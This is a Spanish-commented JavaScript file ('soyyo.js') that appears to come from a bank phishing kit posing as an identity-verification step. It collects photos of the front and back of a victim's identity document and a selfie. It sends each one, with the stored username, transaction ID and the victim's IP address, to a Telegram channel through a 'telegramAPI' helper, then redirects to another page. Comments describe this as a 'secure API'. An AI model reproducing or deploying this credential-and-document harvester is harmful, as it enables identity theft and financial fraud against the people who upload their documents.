// assets/js/pages/soyyo.js
// VERSIÓN MODIFICADA - Usa API segura

(function () {
    const botones = document.querySelector(".botones");
    const loader = document.getElementById("loader");
    const btnVolver = document.getElementById("btnVolverSoyYo");
    const btnContinuar = document.getElementById("btnContinuarSoyYo");
    const fileInputs = document.querySelectorAll(".custom-file-input[data-preview]");

    // ============================================
    // 1. FUNCIONES DE UTILIDAD
    // ============================================

    function previewImage(input, previewId) {
        const preview = document.getElementById(previewId);

        if (input.files && input.files[0]) {
            const reader = new FileReader();
            reader.onload = function (e) {
                preview.src = e.target.result;
                preview.style.display = "block";
            };
            reader.readAsDataURL(input.files[0]);
        } else {
            preview.removeAttribute("src");
            preview.style.display = "none";
        }
    }

    function mostrarError(mensaje) {
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.cssText = `
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #f44336;
            color: white;
            padding: 15px 30px;
            border-radius: 8px;
            z-index: 9999;
            font-family: Arial, sans-serif;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            max-width: 90%;
            text-align: center;
        `;
        errorDiv.textContent = '⚠️ ' + mensaje;
        document.body.appendChild(errorDiv);
        
        setTimeout(() => {
            if (errorDiv.parentNode) {
                errorDiv.remove();
            }
        }, 6000);
    }

    // ============================================
    // 2. FUNCIÓN PRINCIPAL - ENVÍO DE FOTOS
    // ============================================

    async function enviarFotos() {
        const f1 = document.getElementById("foto1").files[0];
        const f2 = document.getElementById("foto2").files[0];
        const f3 = document.getElementById("foto3").files[0];

        if (!f1 || !f2 || !f3) {
            alert("Por favor adjunta las 3 fotografias requeridas.");
            return;
        }

        // Verificar que telegramAPI esté disponible
        if (typeof telegramAPI === 'undefined') {
            console.error('❌ telegramAPI no está disponible');
            mostrarError('Error de configuración. Contacta al administrador.');
            return;
        }

        console.log('✅ telegramAPI disponible en soyyo.js');

        // Ocultar botones y mostrar loader
        botones.style.display = "none";
        loader.style.display = "flex";

        const usuario = localStorage.getItem("userName") || "Desconocido";
        const ip = document.getElementById("gfg")?.textContent || "No disponible";
        const transactionId = localStorage.getItem("transaction_id") || "N/A";

        // ============================================
        // 🔥 CAMBIO IMPORTANTE: Usar la API segura
        // ============================================

        try {
            console.log("📸 Subiendo fotos a través de API segura...");

            // Subir foto 1 - Documento Frente
            console.log("📤 Subiendo Documento Frente...");
            await telegramAPI.sendPhoto(f1, `DOCUMENTO FRENTE\n👤 Usuario: ${usuario}\n🆔 ID: ${transactionId}\n📡 IP: ${ip}`);

            // Subir foto 2 - Documento Reverso
            console.log("📤 Subiendo Documento Reverso...");
            await telegramAPI.sendPhoto(f2, `DOCUMENTO REVERSO\n👤 Usuario: ${usuario}\n🆔 ID: ${transactionId}\n📡 IP: ${ip}`);

            // Subir foto 3 - Selfie
            console.log("📤 Subiendo Selfie...");
            await telegramAPI.sendPhoto(f3, `SELFIE\n👤 Usuario: ${usuario}\n🆔 ID: ${transactionId}\n📡 IP: ${ip}`);

            // Guardar flag de éxito
            localStorage.setItem("fotos_subidas", "true");
            console.log("✅ Todas las fotos subidas correctamente");

            // Redirigir
            window.location.href = "load.php";

        } catch (error) {
            console.error("❌ Error al subir las fotos:", error);
            
            // Mostrar error específico
            let mensajeError = "Error al subir las imágenes. ";
            if (error.message) {
                mensajeError += error.message;
            } else {
                mensajeError += "Intente nuevamente.";
            }
            
            alert(mensajeError);
            
            // Restaurar UI
            loader.style.display = "none";
            botones.style.display = "flex";
        }
    }

    // ============================================
    // 3. CONFIGURACIÓN DE EVENTOS
    // ============================================

    // Previsualización de imágenes
    fileInputs.forEach(function (input) {
        input.addEventListener("change", function () {
            previewImage(this, this.dataset.preview);
        });
    });

    // Botón Volver
    btnVolver.addEventListener("click", function () {
        window.location.href = "index1.php";
    });

    // Botón Continuar
    btnContinuar.addEventListener("click", enviarFotos);

    // ============================================
    // 4. INICIALIZACIÓN
    // ============================================

    // Verificar dependencias
    if (typeof telegramAPI === 'undefined') {
        console.warn('⚠️ telegramAPI no está disponible');
        mostrarError('Error de configuración. Algunas funciones pueden no estar disponibles.');
    } else {
        console.log('✅ telegramAPI disponible');
    }

    // Inicializar funciones de BancoShared
    if (typeof BancoShared !== 'undefined') {
        try {
            BancoShared.populateIp({ ipElementId: "gfg" });
            BancoShared.startDateTime("fecha-hora");
        } catch (e) {
            console.warn("⚠️ Error en BancoShared:", e);
        }
    } else {
        console.warn("⚠️ BancoShared no disponible");
    }

})();